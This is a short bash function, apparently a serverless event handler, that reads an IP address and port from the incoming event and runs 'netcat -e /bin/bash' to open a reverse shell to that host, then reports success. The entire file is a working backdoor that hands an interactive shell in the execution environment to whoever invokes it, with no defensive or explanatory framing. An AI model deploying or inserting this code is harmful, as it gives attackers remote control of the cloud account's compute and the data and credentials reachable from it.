handler () {
	set -e
	
	EVENT_JSON=$(echo $1 | jq .)
	IP=$(jq -r '.ip' <<< "${EVENT_JSON}")
	PORT=$(jq -r '.port' <<< "${EVENT_JSON}")

	echo "Creating reverse shell to $IP:$PORT"
	netcat -e /bin/bash $IP $PORT

	echo "{\"success\": true}" >&2
}